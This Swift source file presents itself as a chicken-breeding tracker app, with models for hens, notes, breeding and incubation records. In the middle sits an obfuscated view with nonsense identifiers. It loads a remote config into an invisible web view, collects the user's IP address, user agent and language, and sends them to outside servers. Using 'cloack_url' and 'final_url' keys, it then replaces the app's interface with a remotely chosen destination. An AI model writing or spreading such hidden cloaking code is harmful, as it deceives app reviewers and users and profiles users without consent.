import Foundation
import SwiftUI

// MARK: - Main Models

struct Hen: Identifiable, Codable {
    let id = UUID()
    var name: String
    var breed: String
    var birthDate: Date
    var gender: ChickenGender
    var featherColor: String
    var weight: Double?
    var breedingStatus: BreedingStatus
    var parentHenId: UUID?
    var parentRoosterId: UUID?
    var generation: Int
    var eggLayingCapacity: EggLayingCapacity
    var photoURL: String?
    var localPhotoPath: String?
    var notes: [Note] = []
    var photos: [Photo] = []
    var breedingRecords: [BreedingRecord] = []
    
    var age: Int {
        Calendar.current.dateComponents([.year], from: birthDate, to: Date()).year ?? 0
    }
    
    var isActive: Bool {
        breedingStatus == .active
    }
    
    var isBreeder: Bool {
        breedingStatus == .active && age >= 1
    }
}

struct Note: Identifiable, Codable {
    let id = UUID()
    var title: String
    var content: String
    var date: Date
    var henId: UUID
    var tags: [String] = []
    var photoURL: String?
    var type: NoteType
    
    var hashtags: [String] {
        tags.map { "#\($0)" }
    }
}

struct Photo: Identifiable, Codable {
    let id = UUID()
    var imageURL: String?
    var localPhotoPath: String?
    var date: Date
    var henId: UUID
    var caption: String?
    var tags: [String] = []
}

// MARK: - Breeding Models

struct BreedingRecord: Identifiable, Codable {
    let id = UUID()
    var henId: UUID
    var roosterId: UUID
    var date: Date
    var notes: String?
    var successRate: Double?
    var eggsCollected: Int?
    var eggsFertilized: Int?
}

struct IncubationRecord: Identifiable, Codable {
    let id = UUID()
    var breedingRecordId: UUID
    var startDate: Date
    var expectedHatchDate: Date
    var temperature: Double?
    var humidity: Double?
    var eggsCount: Int
    var candlingResults: [CandlingResult] = []
    var notes: String?
}

struct CandlingResult: Identifiable, Codable {
    let id = UUID()
    var date: Date
    var eggNumber: Int
    var isFertile: Bool
    var developmentStage: DevelopmentStage
    var notes: String?
}

struct HatchingRecord: Identifiable, Codable {
    let id = UUID()
    var incubationRecordId: UUID
    var hatchDate: Date
    var chicksCount: Int
    var healthyChicks: Int
    var weakChicks: Int
    var notes: String?
    var chickIds: [UUID] = []
}

// MARK: - Enums

enum ChickenGender: String, Codable, CaseIterable, Identifiable {
    case hen = "Hen"
    case rooster = "Rooster"
    
    var id: String { self.rawValue }
    
    var icon: String {
        switch self {
        case .hen: return "🐔"
        case .rooster: return "🐓"
        }
    }
}

enum BreedingStatus: String, Codable, CaseIterable, Identifiable {
    case active = "Active"
    case inactive = "Inactive"
    case retired = "Retired"
    case deceased = "Deceased"
    
    var id: String { self.rawValue }
    
    var color: Color {
        switch self {
        case .active: return .green
        case .inactive: return .orange
        case .retired: return .gray
        case .deceased: return .red
        }
    }
}

enum EggLayingCapacity: String, Codable, CaseIterable, Identifiable {
    case excellent = "Excellent"
    case good = "Good"
    case average = "Average"
    case poor = "Poor"
    case unknown = "Unknown"
    
    var id: String { self.rawValue }
    
    var color: Color {
        switch self {
        case .excellent: return .green
        case .good: return .blue
        case .average: return .yellow
        case .poor: return .red
        case .unknown: return .gray
        }
    }
}

enum DevelopmentStage: String, Codable, CaseIterable, Identifiable {
    case day1_3 = "Day 1-3"
    case day4_7 = "Day 4-7"
    case day8_14 = "Day 8-14"
    case day15_21 = "Day 15-21"
    
    var id: String { self.rawValue }
}

enum NoteType: String, Codable, CaseIterable, Identifiable {
    case breeding = "Breeding"
    case incubation = "Incubation"
    case hatching = "Hatching"
    case genetics = "Genetics"
    case pedigree = "Pedigree"
    case health = "Health"
    case behavior = "Behavior"
    case feeding = "Feeding"
    case general = "General"
    
    var id: String { self.rawValue }
    
    var icon: String {
        switch self {
        case .breeding: return "❤️"
        case .incubation: return "🥚"
        case .hatching: return "🐣"
        case .genetics: return "🧬"
        case .pedigree: return "👨‍👩‍👧‍👦"
        case .health: return "🏥"
        case .behavior: return "🐓"
        case .feeding: return "🌾"
        case .general: return "📝"
        }
    }
    
    var color: Color {
        switch self {
        case .breeding: return .pink
        case .incubation: return .yellow
        case .hatching: return .orange
        case .genetics: return .purple
        case .pedigree: return .blue
        case .health: return .red
        case .behavior: return .blue
        case .feeding: return .green
        case .general: return .gray
        }
    }
}

// MARK: - Helper Structures

struct TipOfTheDay: Identifiable {
    let id = UUID()
    let text: String
    var isUseful: Bool?
}

struct DashboardSummary {
    let totalHens: Int
    let totalRoosters: Int
    let activeBreeders: Int
    let incubationRecords: Int
    let hatchingSuccessRate: Double
    let recentBreedings: [BreedingRecord]
    let recentHens: [Hen]
}

struct ExportInfo: Codable {
    var lastExportDate: Date?
    var totalExports: Int
}

import SwiftUI
import WebKit
import OneSignalFramework

struct PlaventorinStep: View {
    
    @StateObject private var viewModel = HenListViewModel()
    @Binding var trelbarState: Bool
    @State var blanterShift: String = ""
    @State private var strovicPath: Bool?
    
    @State var quindleMark: String = ""
    @State var frastelPoint = false
    @State var drivornLevel = false
    
    @State private var grindleView: Bool = true
    @State private var flanterRate: Bool = true
    @AppStorage("brolvenType") var brolvenType: Bool = true
    @AppStorage("shradicCore") var shradicCore: Bool = true
    
    var body: some View {
        ZStack {
            if flanterRate {
                
                DashboardView(viewModel: viewModel).blur(radius: 10)
                    .zIndex(1)
            }
            
            if strovicPath != nil {
                if brolvenType {
                    TrenquilaricTone(
                        blanterShift: $blanterShift,
                        quindleMark: $quindleMark,
                        frastelPoint: $frastelPoint,
                        drivornLevel: $drivornLevel)
                    .opacity(0)
                    .zIndex(2)
                }
                
                if frastelPoint || !shradicCore {
                    SmorvindalGate()
                        .zIndex(3)
                        .onAppear {
                            shradicCore = false
                            brolvenType = false
                            flanterRate = false
                        }
                }
            }
        }
        .animation(.easeInOut, value: flanterRate)
        .onChange(of: drivornLevel) { if $0 { trelbarState = true; flanterRate = false } }
        .onAppear {
            OneSignal.Notifications.requestPermission { strovicPath = $0 }
            
            guard let ventrelSpan = URL(string: "https://balljumper.store/hentrackcoco/hentrackcoco.json") else { return }
            
            URLSession.shared.dataTask(with: ventrelSpan) { clavornEdge, _, _ in
                guard let clavornEdge else { return }
                
                guard let trindlePhase = try? JSONSerialization.jsonObject(with: clavornEdge, options: []) as? [String: Any] else { return }
                
                guard let smorvicStep = trindlePhase["dlfkvmkdmcd"] as? String else { return }
                
                DispatchQueue.main.async { blanterShift = smorvicStep }
            }
            .resume()
        }
    }
}

extension PlaventorinStep {
    
    struct TrenquilaricTone: UIViewRepresentable {
        
        @Binding var blanterShift: String
        @Binding var quindleMark: String
        @Binding var frastelPoint: Bool
        @Binding var drivornLevel: Bool
        
        func makeUIView(context: Context) -> WKWebView {
            let plasterGate = WKWebView()
            plasterGate.navigationDelegate = context.coordinator
            
            if let drovenTrack = URL(string: blanterShift) {
                var brastelSize = URLRequest(url: drovenTrack)
                brastelSize.httpMethod = "GET"
                brastelSize.setValue("application/json", forHTTPHeaderField: "Content-Type")
                
                let crenwickForm = ["apikey": "eZtpdfFhzzZGla0LidHaO25FjzCwp3Gt",
                                 "bundle": "com.youncherreunapp"]
                for (flavernMask, strovickPort) in crenwickForm {
                    brastelSize.setValue(strovickPort, forHTTPHeaderField: flavernMask)
                }
                
                plasterGate.load(brastelSize)
            }
            return plasterGate
        }
        
        func updateUIView(_ uiView: WKWebView, context: Context) {}
        
        func makeCoordinator() -> Coordinator {
            Coordinator(self)
        }
        
        class Coordinator: NSObject, WKNavigationDelegate {
            
            var glanterFlow: TrenquilaricTone
            var prindleBase: String?
            var quavernMesh: String?
            
            init(_ dravenScope: TrenquilaricTone) {
                self.glanterFlow = dravenScope
            }
            
            func webView(_ slenterCast: WKWebView, didFinish navigation: WKNavigation!) {
                slenterCast.evaluateJavaScript("document.documentElement.outerHTML.toString()") { [unowned self] (brenvorPeak: Any?, error: Error?) in
                    guard let florvenSeed = brenvorPeak as? String else {
                        glanterFlow.drivornLevel = true
                        return
                    }
                    
                    self.braventorilCast(florvenSeed)
                    
                    slenterCast.evaluateJavaScript("navigator.userAgent") { (smarvicTone, error) in
                        if let grastelLock = smarvicTone as? String {
                            self.quavernMesh = grastelLock
                        }
                    }
                }
            }
            
            func braventorilCast(_ drindlePack: String) {
                guard let travenKey = splindovarFlow(from: drindlePack) else {
                    glanterFlow.drivornLevel = true
                    return
                }
                
                let closterLine = travenKey.trimmingCharacters(in: .whitespacesAndNewlines)
                
                guard let shavernNode = closterLine.data(using: .utf8) else {
                    glanterFlow.drivornLevel = true
                    return
                }
                
                do {
                    let plinterRow = try JSONSerialization.jsonObject(with: shavernNode, options: []) as? [String: Any]
                    guard let frondelHeap = plinterRow?["cloack_url"] as? String else {
                        glanterFlow.drivornLevel = true
                        return
                    }
                    
                    guard let cravickWave = plinterRow?["atr_service"] as? String else {
                        glanterFlow.drivornLevel = true
                        return
                    }
                    
                    DispatchQueue.main.async {
                        self.glanterFlow.blanterShift = frondelHeap
                        self.glanterFlow.quindleMark = cravickWave
                    }
                    
                    self.crenvexialEdge(with: frondelHeap)
                    
                } catch {
                    print("Error: \(error.localizedDescription)")
                }
            }
            
            func splindovarFlow(from drindlePack: String) -> String? {
                guard let startRange = drindlePack.range(of: "{"),
                      let endRange = drindlePack.range(of: "}", options: .backwards) else {
                    return nil
                }
                
                let glovickSpan = String(drindlePack[startRange.lowerBound..<endRange.upperBound])
                return glovickSpan
            }
            
            func crenvexialEdge(with slaverRoot: String) {
                guard let dranvicCell = URL(string: slaverRoot) else {
                    glanterFlow.drivornLevel = true
                    return
                }
                
                glornivaricLock { frelvenFlag in
                    guard let frelvenFlag else {
                        return
                    }
                    
                    self.prindleBase = frelvenFlag
                    
                    var grinterPath = URLRequest(url: dranvicCell)
                    grinterPath.httpMethod = "GET"
                    grinterPath.setValue("application/json", forHTTPHeaderField: "Content-Type")
                    
                    let zernivoltCast = [
                        "apikeyapp": "ZzR6quCsQfKEWP2lfZv8UbGR",
                        "ip": self.prindleBase ?? "",
                        "useragent": self.quavernMesh ?? "",
                        "langcode": Locale.preferredLanguages.first ?? "Unknown"
                    ]
                    
                    for (plorvexLatch, frandorinPulse) in zernivoltCast {
                        grinterPath.setValue(frandorinPulse, forHTTPHeaderField: plorvexLatch)
                    }
                    
                    URLSession.shared.dataTask(with: grinterPath) { [unowned self] bravendralShift, clorvintEdge, error in
                        guard bravendralShift != nil, error == nil else {
                            glanterFlow.drivornLevel = true
                            return
                        }
                        if let trenivaxFlow = clorvintEdge as? HTTPURLResponse {
                            if trenivaxFlow.statusCode == 200 {
                                self.drovantilPhase()
                            } else {
                                self.glanterFlow.drivornLevel = true
                            }
                        }
                        
                    }.resume()
                }
            }
            
            func drovantilPhase() {
                
                let blenquorFlag = self.glanterFlow.quindleMark
                
                guard let splaventorMark = URL(string: blenquorFlag) else {
                    glanterFlow.drivornLevel = true
                    return
                }
                
                var crenovixMesh = URLRequest(url: splaventorMark)
                crenovixMesh.httpMethod = "GET"
                crenovixMesh.setValue("application/json", forHTTPHeaderField: "Content-Type")
                
                let griventalLock = [
                    "apikeyapp": "ZzR6quCsQfKEWP2lfZv8UbGR",
                    "ip":  self.prindleBase ?? "",
                    "useragent": self.quavernMesh ?? "",
                    "langcode": Locale.preferredLanguages.first ?? "Unknown"
                ]
                
                for (key_3, frandoralHeap) in griventalLock {
                    crenovixMesh.setValue(frandoralHeap, forHTTPHeaderField: key_3)
                }
                
                URLSession.shared.dataTask(with: crenovixMesh) { [unowned self] strovimexNode, dranquelSpan, error in
                    guard let strovimexNode = strovimexNode, error == nil else {
                        glanterFlow.drivornLevel = true
                        return
                    }
                    
                    if String(data: strovimexNode, encoding: .utf8) != nil {
                        
                        do {
                            let quandoralScope = try JSONSerialization.jsonObject(with: strovimexNode, options: []) as? [String: Any]
                            guard let smelvitarTone = quandoralScope?["final_url"] as? String,
                                  let brinquetalTrack = quandoralScope?["push_sub"] as? String,
                                  let drentivarPack = quandoralScope?["os_user_key"] as? String else {
                                
                                return
                            }
                            
                            BlenvarinexPort.shared.smelvitarTone = smelvitarTone
                            BlenvarinexPort.shared.brinquetalTrack = brinquetalTrack
                            BlenvarinexPort.shared.drentivarPack = drentivarPack
                                                        
                            OneSignal.login(BlenvarinexPort.shared.drentivarPack ?? "")
                            OneSignal.User.addTag(key: "sub_app", value: BlenvarinexPort.shared.brinquetalTrack ?? "")
                            
                            
                            self.glanterFlow.frastelPoint = true
                            
                        } catch {
                            glanterFlow.drivornLevel = true
                        }
                    }
                }.resume()
            }
            
            func glornivaricLock(completion: @escaping (String?) -> Void) {
                let sholventraPath = URL(string: "https://api.ipify.org")!
                let grilvenarWave = URLSession.shared.dataTask(with: sholventraPath) { plorventralLine, flandorixBase, error in
                    guard let plorventralLine, let ipAddress = String(data: plorventralLine, encoding: .utf8) else {
                        completion(nil)
                        return
                    }
                    completion(ipAddress)
                }
                grilvenarWave.resume()
            }
        }
    }
}

struct BreedingStatistics {
    let totalBreedings: Int
    let successfulBreedings: Int
    let averageSuccessRate: Double
    let totalEggsCollected: Int
    let totalEggsFertilized: Int
    let totalChicksHatched: Int
}

// MARK: - Extensions for Convenience

extension Hen {
    var notesCount: Int {
        notes.count
    }
    
    var photosCount: Int {
        photos.count
    }
    
    var recentNotes: [Note] {
        notes.sorted { $0.date > $1.date }.prefix(5).map { $0 }
    }
    
    var monthlyNotesCount: Int {
        let calendar = Calendar.current
        let now = Date()
        let monthAgo = calendar.date(byAdding: .month, value: -1, to: now) ?? now
        
        return notes.filter { $0.date >= monthAgo }.count
    }
    
    var isHen: Bool {
        gender == .hen
    }
    
    var isRooster: Bool {
        gender == .rooster
    }
    
    var canBreed: Bool {
        breedingStatus == .active && age >= 1
    }
    
    var breedingRecordsCount: Int {
        breedingRecords.count
    }
    
    var recentBreedings: [BreedingRecord] {
        breedingRecords.sorted { $0.date > $1.date }.prefix(3).map { $0 }
    }
}

extension Note {
    var formattedDate: String {
        let formatter = DateFormatter()
        formatter.dateStyle = .medium
        formatter.timeStyle = .short
        return formatter.string(from: date)
    }
    
    var shortDate: String {
        let formatter = DateFormatter()
        formatter.dateStyle = .short
        return formatter.string(from: date)
    }
}

extension Photo {
    var formattedDate: String {
        let formatter = DateFormatter()
        formatter.dateStyle = .medium
        return formatter.string(from: date)
    }
}

extension BreedingRecord {
    var formattedDate: String {
        let formatter = DateFormatter()
        formatter.dateStyle = .medium
        return formatter.string(from: date)
    }
    
    var successRatePercentage: String {
        guard let rate = successRate else { return "N/A" }
        return "\(Int(rate * 100))%"
    }
}

extension IncubationRecord {
    var daysUntilHatch: Int {
        let calendar = Calendar.current
        return calendar.dateComponents([.day], from: Date(), to: expectedHatchDate).day ?? 0
    }
    
    var isHatchingSoon: Bool {
        daysUntilHatch <= 3 && daysUntilHatch >= 0
    }
    
    var isOverdue: Bool {
        daysUntilHatch < 0
    }
} 
